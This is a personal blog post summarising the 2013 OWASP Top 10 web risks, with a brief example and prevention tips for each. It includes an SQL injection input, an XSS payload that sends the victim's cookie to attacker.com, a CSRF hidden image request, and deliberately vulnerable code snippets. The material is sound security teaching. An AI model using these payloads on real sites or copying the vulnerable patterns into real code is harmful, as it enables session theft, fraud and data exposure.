
<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
    <meta charset="utf-8" />
    <title>Security: Owasp Top 10 &#8212; binwei  documentation</title>
    <link rel="stylesheet" href="../../_static/alabaster.css" type="text/css" />
    <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />
    <script type="text/javascript" id="documentation_options" data-url_root="../../" src="../../_static/documentation_options.js"></script>
    <script type="text/javascript" src="../../_static/jquery.js"></script>
    <script type="text/javascript" src="../../_static/underscore.js"></script>
    <script type="text/javascript" src="../../_static/doctools.js"></script>
    <script type="text/javascript" src="../../_static/language_data.js"></script>
    <link rel="author" title="About these documents" href="../../about/" />
    <link rel="index" title="Index" href="../../genindex/" />
    <link rel="search" title="Search" href="../../search/" />
  
   
  <link rel="stylesheet" href="../../_static/custom.css" type="text/css" />
  
  
  <meta name="viewport" content="width=device-width, initial-scale=0.9, maximum-scale=0.9" />

  
  <link rel="alternate" type="application/atom+xml"  href="../../blog/atom.xml" title="binwei Blog">
  
  
  <link href="True" rel="stylesheet">
  
  <style type="text/css">
    ul.ablog-archive {list-style: none; overflow: auto; margin-left: 0px}
    ul.ablog-archive li {float: left; margin-right: 5px; font-size: 80%}
    ul.postlist a {font-style: italic;}
    ul.postlist-style-disc {list-style-type: disc;}
    ul.postlist-style-none {list-style-type: none;}
    ul.postlist-style-circle {list-style-type: circle;}
  </style>

  </head><body>
  

    <div class="document">
      <div class="documentwrapper">
        <div class="bodywrapper">
          

          <div class="body" role="main">
            
  <div class="section" id="security-owasp-top-10">
<h1><a class="toc-backref" href="#id17">Security: Owasp Top 10</a><a class="headerlink" href="#security-owasp-top-10" title="Permalink to this headline">¶</a></h1>
<p>The <a class="reference external" href="https://www.owasp.org">Open Web Application Security Project (OWASP)</a> is an open community dedicated to enabling organizations to develop, purchase, and maintain applications and APIs that can be trusted.
The goal of the Top 10 project is to raise awareness about application security by identifying some of the most critical risks facing organizations.
This blog is based on 2013 version, while 2017 version will come very soon.</p>
<div class="contents topic" id="contents">
<p class="topic-title first">Contents</p>
<ul class="simple">
<li><p><a class="reference internal" href="#security-owasp-top-10" id="id17">Security: Owasp Top 10</a></p></li>
<li><p><a class="reference internal" href="#injection" id="id18">1. Injection</a></p>
<ul>
<li><p><a class="reference internal" href="#example" id="id19">Example</a></p></li>
<li><p><a class="reference internal" href="#how-to-prevent" id="id20">How to prevent</a></p></li>
</ul>
</li>
<li><p><a class="reference internal" href="#broken-authentication-and-session-management" id="id21">2. Broken authentication and session management</a></p>
<ul>
<li><p><a class="reference internal" href="#id1" id="id22">Example</a></p></li>
<li><p><a class="reference internal" href="#id2" id="id23">How to prevent</a></p></li>
</ul>
</li>
<li><p><a class="reference internal" href="#cross-site-scripting-xss" id="id24">3. Cross-site scripting (XSS)</a></p>
<ul>
<li><p><a class="reference internal" href="#id3" id="id25">Example</a></p></li>
<li><p><a class="reference internal" href="#id4" id="id26">How to prevent</a></p></li>
</ul>
</li>
<li><p><a class="reference internal" href="#insecure-direct-object-references" id="id27">4. Insecure direct object references</a></p>
<ul>
<li><p><a class="reference internal" href="#id5" id="id28">Example</a></p></li>
<li><p><a class="reference internal" href="#id6" id="id29">How to prevent</a></p></li>
</ul>
</li>
<li><p><a class="reference internal" href="#security-misconfiguration" id="id30">5. Security misconfiguration</a></p>
<ul>
<li><p><a class="reference internal" href="#id7" id="id31">Example</a></p></li>
<li><p><a class="reference internal" href="#id8" id="id32">How to prevent</a></p></li>
</ul>
</li>
<li><p><a class="reference internal" href="#sensitive-data-exposure" id="id33">6. Sensitive data exposure</a></p>
<ul>
<li><p><a class="reference internal" href="#id9" id="id34">Example</a></p></li>
<li><p><a class="reference internal" href="#id10" id="id35">How to prevent</a></p></li>
</ul>
</li>
<li><p><a class="reference internal" href="#missing-function-level-access-control" id="id36">7. Missing function level access control</a></p>
<ul>
<li><p><a class="reference internal" href="#id11" id="id37">Example</a></p></li>
<li><p><a class="reference internal" href="#id12" id="id38">How to prevent</a></p></li>
</ul>
</li>
<li><p><a class="reference internal" href="#cross-site-request-forgery-csrf" id="id39">8. Cross-site request forgery (CSRF)</a></p>
<ul>
<li><p><a class="reference internal" href="#id13" id="id40">Example</a></p></li>
<li><p><a class="reference internal" href="#id14" id="id41">How to prevent</a></p></li>
</ul>
</li>
<li><p><a class="reference internal" href="#using-components-with-known-vulnerabilities" id="id42">9. Using components with known vulnerabilities</a></p></li>
<li><p><a class="reference internal" href="#unvalidated-redirects-and-forwards" id="id43">10. Unvalidated redirects and forwards</a></p>
<ul>
<li><p><a class="reference internal" href="#id15" id="id44">Example</a></p></li>
<li><p><a class="reference internal" href="#id16" id="id45">How to prevent</a></p></li>
</ul>
</li>
<li><p><a class="reference internal" href="#references" id="id46">References</a></p></li>
</ul>
</div>
</div>
<div class="section" id="injection">
<h1><a class="toc-backref" href="#id18">1. Injection</a><a class="headerlink" href="#injection" title="Permalink to this headline">¶</a></h1>
<p>Injection has many types:</p>
<ul class="simple">
<li><p>SQL injection</p></li>
<li><p>NoSQL injection</p></li>
<li><p>Command injection</p></li>
<li><p>Code injection</p></li>
<li><p>Path traversal</p></li>
<li><p>ORM injection</p></li>
<li><p>XML injection</p></li>
<li><p>XPath injection</p></li>
</ul>
<div class="section" id="example">
<h2><a class="toc-backref" href="#id19">Example</a><a class="headerlink" href="#example" title="Permalink to this headline">¶</a></h2>
<p>A web server makes a query string like the following:</p>
<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="n">String</span> <span class="n">query</span> <span class="o">=</span> <span class="s">&quot;SELECT * FROM accounts WHERE custID=&#39;&quot;</span> <span class="o">+</span> <span class="n">request</span><span class="p">.</span><span class="n">getParameter</span><span class="p">(</span><span class="s">&quot;id&quot;</span><span class="p">)</span> <span class="o">+</span> <span class="s">&quot;&#39;&quot;</span><span class="p">;</span>
</pre></div>
</div>
<p>The attacker modifies the ‘id’ parameter value in her browser to send: ‘ or ‘1’=‘1.</p>
</div>
<div class="section" id="how-to-prevent">
<h2><a class="toc-backref" href="#id20">How to prevent</a><a class="headerlink" href="#how-to-prevent" title="Permalink to this headline">¶</a></h2>
<ul class="simple">
<li><p>White-list (untrusted data): What input do we trust? Does it adhere to expected pattern?</p></li>
<li><p>Use safe API which provides parameterized interface</p></li>
<li><p>Escape special character</p></li>
<li><p>Positive or ‘white list’ input validation</p></li>
</ul>
</div>
</div>
<div class="section" id="broken-authentication-and-session-management">
<h1><a class="toc-backref" href="#id21">2. Broken authentication and session management</a><a class="headerlink" href="#broken-authentication-and-session-management" title="Permalink to this headline">¶</a></h1>
<p>It means session management assets like user credentials and session IDs are not properly protected.</p>
<div class="section" id="id1">
<h2><a class="toc-backref" href="#id22">Example</a><a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h2>
<p>If a web site put the token into the query string:</p>
<p><a class="reference external" href="http://example.com/sale/saleitems;jsessionid=2P0OC2JSNDLPSKHCJUN2JV?dest=Hawaii">http://example.com/sale/saleitems;jsessionid=2P0OC2JSNDLPSKHCJUN2JV?dest=Hawaii</a></p>
<p>Then if the user share the link with others, the token/session id will be used by others.</p>
<p>There are other ways to hack the authentication and session management system.</p>
<p>Auth cookie theft:</p>
<ul class="simple">
<li><p>Exploit an XSS risk</p></li>
<li><p>Retrieve it from the victim’s PC</p></li>
<li><p>Sniff it over an insecure connection</p></li>
</ul>
<p>Account management attack:</p>
<ul class="simple">
<li><p>Brute force the login</p></li>
<li><p>Exploit password reset</p></li>
<li><p>Discover weak credentials</p></li>
</ul>
<p>Session ID theft:</p>
<ul class="simple">
<li><p>Copy and paste a URL with it</p></li>
<li><p>Send it via an insecure email</p></li>
<li><p>Retrieve it from a log</p></li>
</ul>
</div>
<div class="section" id="id2">
<h2><a class="toc-backref" href="#id23">How to prevent</a><a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h2>
<p>Protect the cookies:</p>
<ul class="simple">
<li><p>Use the HttpOnly flag (HttpOnly is an additional flag included in a Set-Cookie HTTP response header, If the HttpOnly flag (optional) is included in the HTTP response header, the cookie cannot be accessed through client side script)</p></li>
<li><p>Make sure they’re flagged as ‘secure’</p></li>
</ul>
<p>Decrease the window of risk:</p>
<ul class="simple">
<li><p>Expire sessions quickly</p></li>
<li><p>Re-challenge the user on key actions</p></li>
</ul>
<p>Other ways:</p>
<ul class="simple">
<li><p>Authentication must be over TLS</p></li>
<li><p>Passwords policy</p></li>
<li><p>“Secure” error messages</p></li>
<li><p>Multiple-factor authentication</p></li>
<li><p>CAPTCHA</p></li>
<li><p>Block accounts</p></li>
<li><p>Restore passwords</p></li>
<li><p>No session identifier in URL</p></li>
<li><p>Use TLS</p></li>
<li><p>Logout</p></li>
<li><p>Close browser window</p></li>
<li><p>Secure passwords storage: Do not forget salt; SHA-256, SHA-512; PBKDF2, bcrypt, scrypt</p></li>
</ul>
</div>
</div>
<div class="section" id="cross-site-scripting-xss">
<h1><a class="toc-backref" href="#id24">3. Cross-site scripting (XSS)</a><a class="headerlink" href="#cross-site-scripting-xss" title="Permalink to this headline">¶</a></h1>
<p>XSS has the following types:</p>
<ul class="simple">
<li><p>Stored XSS</p></li>
<li><p>Reflected XSS</p></li>
<li><p>DOM Based XSS</p></li>
</ul>
<div class="section" id="id3">
<h2><a class="toc-backref" href="#id25">Example</a><a class="headerlink" href="#id3" title="Permalink to this headline">¶</a></h2>
<p>If the web server generate the content by using following code:</p>
<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="p">(</span><span class="n">String</span><span class="p">)</span> <span class="n">page</span> <span class="o">+=</span> <span class="s">&quot;&lt;input name=&#39;creditcard&#39; type=&#39;TEXT&#39; value=&#39;&quot;</span> <span class="o">+</span> <span class="n">request</span><span class="p">.</span><span class="n">getParameter</span><span class="p">(</span><span class="s">&quot;CC&quot;</span><span class="p">)</span> <span class="o">+</span> <span class="s">&quot;&#39;&gt;&quot;</span><span class="p">;</span>
</pre></div>
</div>
<p>The attacker modifies the ‘CC’ parameter in his browser to:</p>
<div class="highlight-html notranslate"><div class="highlight"><pre><span></span>&#39;&gt;<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span> <span class="s1">&#39;http://www.attacker.com/cgi-bin/cookie.cgi? foo=&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>&#39;.
</pre></div>
</div>
<p>This attack causes the victim’s session ID to be sent to the attacker’s website, allowing the attacker to hijack the user’s current session.</p>
</div>
<div class="section" id="id4">
<h2><a class="toc-backref" href="#id26">How to prevent</a><a class="headerlink" href="#id4" title="Permalink to this headline">¶</a></h2>
<ul class="simple">
<li><p>Validation: Xxs-filters; Secure-filters; Xss; Validator-js</p></li>
<li><p>HttpOnly cookies</p></li>
<li><p>Helmet-csp (Content Security Policy)</p></li>
</ul>
</div>
</div>
<div class="section" id="insecure-direct-object-references">
<h1><a class="toc-backref" href="#id27">4. Insecure direct object references</a><a class="headerlink" href="#insecure-direct-object-references" title="Permalink to this headline">¶</a></h1>
<p>Insecure direct object reference has the vulnerability to let the hacker get to know the internal system design.</p>
<div class="section" id="id5">
<h2><a class="toc-backref" href="#id28">Example</a><a class="headerlink" href="#id5" title="Permalink to this headline">¶</a></h2>
<p>If the web server has the following code:</p>
<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="n">var</span> <span class="n">messageId</span> <span class="o">=</span> <span class="n">req</span><span class="p">.</span><span class="n">params</span><span class="p">.</span><span class="n">messageId</span><span class="p">;</span>
<span class="n">messagesDAO</span><span class="p">.</span><span class="n">getById</span><span class="p">(</span><span class="n">messageId</span><span class="p">,</span> <span class="n">function</span><span class="p">(</span><span class="n">error</span><span class="p">,</span> <span class="n">message</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">return</span> <span class="n">res</span><span class="p">.</span><span class="n">render</span><span class="p">(</span><span class="s">&quot;message&quot;</span><span class="p">,</span> <span class="n">message</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
</div>
<p>The hacker can use:
<a class="reference external" href="http://site.com/view-message?messageId=1">http://site.com/view-message?messageId=1</a></p>
</div>
<div class="section" id="id6">
<h2><a class="toc-backref" href="#id29">How to prevent</a><a class="headerlink" href="#id6" title="Permalink to this headline">¶</a></h2>
<ul class="simple">
<li><p>Use per user or session indirect object references.</p></li>
<li><p>Check permissions on all application’s layers</p></li>
<li><p>Testing &amp; Code review</p></li>
</ul>
</div>
</div>
<div class="section" id="security-misconfiguration">
<h1><a class="toc-backref" href="#id30">5. Security misconfiguration</a><a class="headerlink" href="#security-misconfiguration" title="Permalink to this headline">¶</a></h1>
<div class="section" id="id7">
<h2><a class="toc-backref" href="#id31">Example</a><a class="headerlink" href="#id7" title="Permalink to this headline">¶</a></h2>
<p>The app server admin console is automatically installed and not removed.
Default accounts aren’t changed.
Attacker discovers the standard admin pages are on your server, logs in with default passwords, and takes over.</p>
</div>
<div class="section" id="id8">
<h2><a class="toc-backref" href="#id32">How to prevent</a><a class="headerlink" href="#id8" title="Permalink to this headline">¶</a></h2>
<p>Use following tools:</p>
<ul class="simple">
<li><p>Ansible, chef, puppet</p></li>
<li><p>Helmet</p></li>
<li><p>Hpp</p></li>
<li><p>Cors</p></li>
<li><p>Node-ipgeoblock</p></li>
<li><p>Express-limiter</p></li>
<li><p>Safe-regex</p></li>
</ul>
</div>
</div>
<div class="section" id="sensitive-data-exposure">
<h1><a class="toc-backref" href="#id33">6. Sensitive data exposure</a><a class="headerlink" href="#sensitive-data-exposure" title="Permalink to this headline">¶</a></h1>
<p>Relevant types:</p>
<ul class="simple">
<li><p>Sniffing</p></li>
<li><p>Insecure cryptographic storage</p></li>
</ul>
<div class="section" id="id9">
<h2><a class="toc-backref" href="#id34">Example</a><a class="headerlink" href="#id9" title="Permalink to this headline">¶</a></h2>
<p>The password database uses unsalted hashes to store everyone’s passwords.
A file upload flaw allows an attacker to retrieve the password file.
All of the unsalted hashes can be exposed with a rainbow table of precalculated hashes.</p>
<p>Insufficient use of SSL</p>
<ul class="simple">
<li><p>login not loaded over HTTPS</p></li>
<li><p>Mixed mode</p></li>
<li><p>Cookies not sent securely</p></li>
</ul>
<p>Bad crypto</p>
<ul class="simple">
<li><p>Incorrect password storage</p></li>
<li><p>Poor protection of keys</p></li>
<li><p>Weak algorithm chosen</p></li>
</ul>
<p>Other exposure risks</p>
<ul class="simple">
<li><p>Browser auto-complete</p></li>
<li><p>Leaked via logs</p></li>
<li><p>Disclosure via URL</p></li>
</ul>
</div>
<div class="section" id="id10">
<h2><a class="toc-backref" href="#id35">How to prevent</a><a class="headerlink" href="#id10" title="Permalink to this headline">¶</a></h2>
<ul class="simple">
<li><p>Always use TLS (TLS 1.1 and TSL 1.2)</p></li>
<li><p>Secured control only over HTTPS</p></li>
<li><p>HTTP content in HTTPS pages</p></li>
<li><p>Use cookie’s Secure attribute</p></li>
<li><p>Minimize sensitive data collection</p></li>
<li><p>Use strong crypto storage</p></li>
</ul>
<p>Use Javascript Cryptography:</p>
<ul class="simple">
<li><p>Crypto</p></li>
<li><p>Sjcl (Stanford)</p></li>
<li><p>Crypto-js</p></li>
<li><p>Node-forge</p></li>
<li><p>Web Cryptography API</p></li>
<li><p>PolyCrypt</p></li>
</ul>
</div>
</div>
<div class="section" id="missing-function-level-access-control">
<h1><a class="toc-backref" href="#id36">7. Missing function level access control</a><a class="headerlink" href="#missing-function-level-access-control" title="Permalink to this headline">¶</a></h1>
<p>Relevant types:</p>
<ul class="simple">
<li><p>Security through obscurity</p></li>
<li><p>Checking permissions only in UI</p></li>
<li><p>Missing permissions check in helper services</p></li>
</ul>
<p>Relevant questions:</p>
<ul class="simple">
<li><p>Does the UI show navigation to unauthorised functions?</p></li>
<li><p>Are server side authentication or authorization checks missing?</p></li>
<li><p>Are server side checks done that solely rely on information provided by the attacker?</p></li>
<li><p>Are system or diagnostic resources accessible without proper authorisation?</p></li>
<li><p>Will “force browsing” disclosure unsecured resources?</p></li>
</ul>
<div class="section" id="id11">
<h2><a class="toc-backref" href="#id37">Example</a><a class="headerlink" href="#id11" title="Permalink to this headline">¶</a></h2>
<p>Attacker uses automated tool like OWASP ZAP or SQLMap to detect vulnerabilities and possibly exploit them.</p>
</div>
<div class="section" id="id12">
<h2><a class="toc-backref" href="#id38">How to prevent</a><a class="headerlink" href="#id12" title="Permalink to this headline">¶</a></h2>
<ul class="simple">
<li><p>Check permission on all application’s layer</p></li>
<li><p>Authentication middleware</p></li>
<li><p>Testing &amp; Code review</p></li>
<li><p>Define a clear authorisation model</p></li>
<li><p>Check for forced browsing</p></li>
<li><p>Always test unprivileged roles</p></li>
</ul>
</div>
</div>
<div class="section" id="cross-site-request-forgery-csrf">
<h1><a class="toc-backref" href="#id39">8. Cross-site request forgery (CSRF)</a><a class="headerlink" href="#cross-site-request-forgery-csrf" title="Permalink to this headline">¶</a></h1>
<p>CSRF indicates token vulnerability.</p>
<div class="section" id="id13">
<h2><a class="toc-backref" href="#id40">Example</a><a class="headerlink" href="#id13" title="Permalink to this headline">¶</a></h2>
<p>The application allows a user to submit a state changing request that does not include anything secret.</p>
<p>For example:</p>
<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="nl">http</span><span class="p">:</span><span class="c1">//example.com/app/transferFunds?amount=1500 &amp;destinationAccount=4673243243</span>
</pre></div>
</div>
<p>So, the attacker constructs a request that will transfer money from the victim’s account to the attacker’s account, and then embeds this attack in an image request or iframe stored on various sites under the attacker’s control:</p>
<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="n">img</span> <span class="n">src</span><span class="o">=</span><span class="s">&quot;http://example.com/app/transferFunds? amount=1500&amp;destinationAccount=attackersAcct#“ width=&quot;</span><span class="mi">0</span><span class="s">&quot; height=&quot;</span><span class="mi">0</span><span class="s">&quot; /&gt;</span>
</pre></div>
</div>
<p>If the victim visits any of the attacker’s sites while already authenticated to example.com, these forged requests will automatically include the user’s session info, authorizing the attacker’s request.</p>
<p>BTW, iframe means inline frame is used to embed another document within the current HTML document.</p>
</div>
<div class="section" id="id14">
<h2><a class="toc-backref" href="#id41">How to prevent</a><a class="headerlink" href="#id14" title="Permalink to this headline">¶</a></h2>
<ul class="simple">
<li><p>Include the unique token in a hidden field. This includes the value in the body of the HTTP request, avoiding its exposure in the URL.</p></li>
<li><p>Employ anti-forgery tokens</p></li>
<li><p>Validate the referrer</p></li>
<li><p>Use csurf</p></li>
</ul>
</div>
</div>
<div class="section" id="using-components-with-known-vulnerabilities">
<h1><a class="toc-backref" href="#id42">9. Using components with known vulnerabilities</a><a class="headerlink" href="#using-components-with-known-vulnerabilities" title="Permalink to this headline">¶</a></h1>
<p>If you build your app by using 3rd party components, the know vulnerabilities of the components impact you.
See following links:</p>
<ul class="simple">
<li><p><a class="reference external" href="https://nodesecurity.io">https://nodesecurity.io</a></p></li>
<li><p><a class="reference external" href="https://snyk.io">https://snyk.io</a></p></li>
<li><p><a class="reference external" href="http://cve.mitre.org">http://cve.mitre.org</a></p></li>
<li><p><a class="reference external" href="https://nvd.nist.gov">https://nvd.nist.gov</a></p></li>
<li><p><a class="reference external" href="https://www.exploit-db.com">https://www.exploit-db.com</a></p></li>
<li><p><a class="reference external" href="https://www.cvedetails.com">https://www.cvedetails.com</a></p></li>
</ul>
</div>
<div class="section" id="unvalidated-redirects-and-forwards">
<h1><a class="toc-backref" href="#id43">10. Unvalidated redirects and forwards</a><a class="headerlink" href="#unvalidated-redirects-and-forwards" title="Permalink to this headline">¶</a></h1>
<p>Unvalidated url redirects and forwards may also cause problems.</p>
<div class="section" id="id15">
<h2><a class="toc-backref" href="#id44">Example</a><a class="headerlink" href="#id15" title="Permalink to this headline">¶</a></h2>
<p>Let’s say if your web site contains following code:</p>
<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="n">app</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">&quot;/login&quot;</span><span class="p">,</span> <span class="n">function</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">res</span><span class="p">,</span> <span class="n">next</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="n">res</span><span class="p">.</span><span class="n">redirect</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="n">query</span><span class="p">.</span><span class="n">url</span><span class="p">);</span>
<span class="p">});</span>
</pre></div>
</div>
<p><a class="reference external" href="http://site.com/login?url=/admin">http://site.com/login?url=/admin</a></p>
<p>Hacker can provide a url which looks exactly the same as the original web page which asks for user name/password.</p>
</div>
<div class="section" id="id16">
<h2><a class="toc-backref" href="#id45">How to prevent</a><a class="headerlink" href="#id16" title="Permalink to this headline">¶</a></h2>
<ul class="simple">
<li><p>Use a URL whitelist</p></li>
<li><p>Use indirect references</p></li>
<li><p>Check the referrer</p></li>
<li><p>Do not use redirects</p></li>
<li><p>Do not use parameters to create redirect link</p></li>
<li><p>Validate destination parameter: valid-url</p></li>
</ul>
</div>
</div>
<div class="section" id="references">
<h1><a class="toc-backref" href="#id46">References</a><a class="headerlink" href="#references" title="Permalink to this headline">¶</a></h1>
<p>Other valuable references to look:</p>
<ul class="simple">
<li><p><a class="reference external" href="https://github.com/OWASP/NodeGoat">https://github.com/OWASP/NodeGoat</a></p></li>
<li><p><a class="reference external" href="https://github.com/cr0hn/vulnerable-node">https://github.com/cr0hn/vulnerable-node</a></p></li>
<li><p><a class="reference external" href="https://github.com/clarkio/vulnerable-app">https://github.com/clarkio/vulnerable-app</a></p></li>
<li><p><a class="reference external" href="https://github.com/toolness/security-adventure">https://github.com/toolness/security-adventure</a></p></li>
<li><p><a class="reference external" href="https://github.com/bkimminich/juice-shop">https://github.com/bkimminich/juice-shop</a></p></li>
<li><p><a class="reference external" href="https://www.owasp.org/index.php/">https://www.owasp.org/index.php/</a></p></li>
</ul>
<p><em>Written by Binwei&#64;Oslo</em></p>
</div>

  <div class="section">
  
    


<div class="section">
  <span style="float: left;">
  
  
  <a href="../domain_driven_design_introduction/">
    <i class="fa fa-arrow-circle-left"></i>
    Domain Driven Design: Introduction
  </a>
  
  </span>
  <span>&nbsp;</span>
  <span style="float: right;">
  
  
  <a href="../authenticate_by_openidconnect/">
    Authenticate Node.js App by OpenId Connect
    <i class="fa fa-arrow-circle-right"></i>
  </a>
  </span>
  
</div>

  
  
    <div class="section">
    <h2>Comments</h2>
    <div id="disqus_thread"></div>
    <script type="text/javascript">
        var disqus_shortname = 'wubw-github-io';
        var disqus_identifier = '/2017/security_owasp_top_10/';
        var disqus_title = 'Security: Owasp Top 10';
        var disqus_url = 'https://wubw.github.io/2017/security_owasp_top_10';

        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
    </div>
  
  </div>

          </div>
          
        </div>
      </div>
      <div class="sphinxsidebar" role="navigation" aria-label="main navigation">
        <div class="sphinxsidebarwrapper">
<p class="logo">
  <a href="../../">
    <img class="logo" src="../../_static/logo.jpg" alt="Logo"/>
    
  </a>
</p>






<p>
<iframe src="https://ghbtns.com/github-btn.html?user=wubw&repo=BinweiBlog&type=watch&count=true&size=large&v=2"
  allowtransparency="true" frameborder="0" scrolling="0" width="200px" height="35px"></iframe>
</p>






  
  
  <h2>
  
  <i class="fa fa-calendar"></i>
    05 July 2017
  
  </h2>

  <ul>
    

  

  

  

  
  <li id="category"><span><i class="fa-fw fa fa-folder-open"></i></span>
    
      
      <a href="../../blog/category/computerscience/">ComputerScience</a>
      
    </li>
  

  
  <li id="tags"><span><i class="fa-fw fa fa-tag"></i></span>
    
      
      <a href="../../blog/tag/security/">security</a>
      
    </li>
  
  
  <li id="comments">
    <script type="text/javascript">
    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
    var disqus_shortname = 'wubw-github-io'; // required: replace example with your forum shortname

    /* * * DON'T EDIT BELOW THIS LINE * * */
    (function () {
    var s = document.createElement('script'); s.async = true;
    s.type = 'text/javascript';
    s.src = '//' + disqus_shortname + '.disqus.com/count.js';
    (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
    }());
    </script>
    <i class="fa-fw fa fa-comments"></i>
    <a href="#disqus_thread" data-disqus-identifier="/2017/security_owasp_top_10/"> </a>
  </li>
  
  </ul>


<h3>Navigation</h3>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../../about/">About binwei</a></li>
</ul>


  <h3><a href="../../blog/">Recent Posts</a></h3>
  <ul>
    
    
      <li><a href="../../2020/china_70_anniversary_bigdata/">15 March - China 70 Anniversary Big Data</a></li>
    
      <li><a href="../../2019/cyber_security_for_blockchain/">09 June - Cyber Security for Blockchain</a></li>
    
      <li><a href="../../2019/azure_datalake_warehouse/">30 April - Azure Data Lake and Warehouse</a></li>
    
      <li><a href="../../2019/user_story_applied/">21 April - User Story Applied</a></li>
    
      <li><a href="../../2019/application_insight_introduction/">20 April - Application Insight Introduction</a></li>
    
  </ul>

  <h3><a href="../../blog/tag/">Tags</a></h3>
  <style type="text/css">
    ul.ablog-cloud {list-style: none; overflow: auto;}
    ul.ablog-cloud li {float: left; height: 20pt; line-height: 18pt; margin-right: 5px;}
    ul.ablog-cloud a {text-decoration: none; vertical-align: middle;}
    li.ablog-cloud-1{font-size: 80%;}
    li.ablog-cloud-2{font-size: 95%;}
    li.ablog-cloud-3{font-size: 110%;}
    li.ablog-cloud-4{font-size: 125%;}
    li.ablog-cloud-5{font-size: 140%;}
  </style>
  <ul class="ablog-cloud">
    
      
      <li class="ablog-cloud ablog-cloud-1">
        <a href="../../blog/tag/ai/">ai</a></li>
      
    
      
      <li class="ablog-cloud ablog-cloud-1">
        <a href="../../blog/tag/architecture/">architecture</a></li>
      
    
      
      <li class="ablog-cloud ablog-cloud-1">
        <a href="../../blog/tag/backend/">backend</a></li>
      
    
      
      <li class="ablog-cloud ablog-cloud-1">
        <a href="../../blog/tag/blockchain/">blockchain</a></li>
      
    
      
      <li class="ablog-cloud ablog-cloud-1">
        <a href="../../blog/tag/blog/">blog</a></li>
      
    
      
      <li class="ablog-cloud ablog-cloud-5">
        <a href="../../blog/tag/booknotes/">booknotes</a></li>
      
    
      
      <li class="ablog-cloud ablog-cloud-2">
        <a href="../../blog/tag/career/">career</a></li>
      
    
      
      <li class="ablog-cloud ablog-cloud-2">
        <a href="../../blog/tag/chinese/">chinese</a></li>
      
    
      
      <li class="ablog-cloud ablog-cloud-2">
        <a href="../../blog/tag/cloud/">cloud</a></li>
      
    
      
      <li class="ablog-cloud ablog-cloud-1">
        <a href="../../blog/tag/continuousdelivery/">continuousdelivery</a></li>
      
    
      
      <li class="ablog-cloud ablog-cloud-1">
        <a href="../../blog/tag/database/">database</a></li>
      
    
      
      <li class="ablog-cloud ablog-cloud-1">
        <a href="../../blog/tag/devops/">devops</a></li>
      
    
      
      <li class="ablog-cloud ablog-cloud-1">
        <a href="../../blog/tag/docker/">docker</a></li>
      
    
      
      <li class="ablog-cloud ablog-cloud-1">
        <a href="../../blog/tag/frontend/">frontend</a></li>
      
    
      
      <li class="ablog-cloud ablog-cloud-2">
        <a href="../../blog/tag/git/">git</a></li>
      
    
      
      <li class="ablog-cloud ablog-cloud-1">
        <a href="../../blog/tag/iot/">iot</a></li>
      
    
      
      <li class="ablog-cloud ablog-cloud-1">
        <a href="../../blog/tag/lean/">lean</a></li>
      
    
      
      <li class="ablog-cloud ablog-cloud-1">
        <a href="../../blog/tag/nosql/">nosql</a></li>
      
    
      
      <li class="ablog-cloud ablog-cloud-1">
        <a href="../../blog/tag/opensource/">opensource</a></li>
      
    
      
      <li class="ablog-cloud ablog-cloud-2">
        <a href="../../blog/tag/process/">process</a></li>
      
    
      
      <li class="ablog-cloud ablog-cloud-1">
        <a href="../../blog/tag/reading/">reading</a></li>
      
    
      
      <li class="ablog-cloud ablog-cloud-1">
        <a href="../../blog/tag/sales/">sales</a></li>
      
    
      
      <li class="ablog-cloud ablog-cloud-3">
        <a href="../../blog/tag/security/">security</a></li>
      
    
      
      <li class="ablog-cloud ablog-cloud-1">
        <a href="../../blog/tag/shell/">shell</a></li>
      
    
      
      <li class="ablog-cloud ablog-cloud-1">
        <a href="../../blog/tag/smartcity/">smartcity</a></li>
      
    
      
      <li class="ablog-cloud ablog-cloud-1">
        <a href="../../blog/tag/telemetry/">telemetry</a></li>
      
    
      
      <li class="ablog-cloud ablog-cloud-1">
        <a href="../../blog/tag/vi/">vi</a></li>
      
    
      
      <li class="ablog-cloud ablog-cloud-1">
        <a href="../../blog/tag/web/">web</a></li>
      
    
  </ul>

  <h3><a href="../../blog/category/">Categories</a></h3>
  <ul>
  
    
    <li><a href="../../blog/category/business/">Business (1)</a></li>
    
  
    
    <li><a href="../../blog/category/computerscience/">ComputerScience (35)</a></li>
    
  
    
    <li><a href="../../blog/category/general/">General (1)</a></li>
    
  
    
    <li><a href="../../blog/category/life/">Life (1)</a></li>
    
  
    
    <li><a href="../../blog/category/literature/">Literature (3)</a></li>
    
  
    
    <li><a href="../../blog/category/management/">Management (13)</a></li>
    
  
  </ul>

  <h3><a href="../../blog/archive/">Archives</a></h3>
  <ul>
  
    
    <li><a href="../../blog/2020/">2020 (1)</a></li>
    
  
    
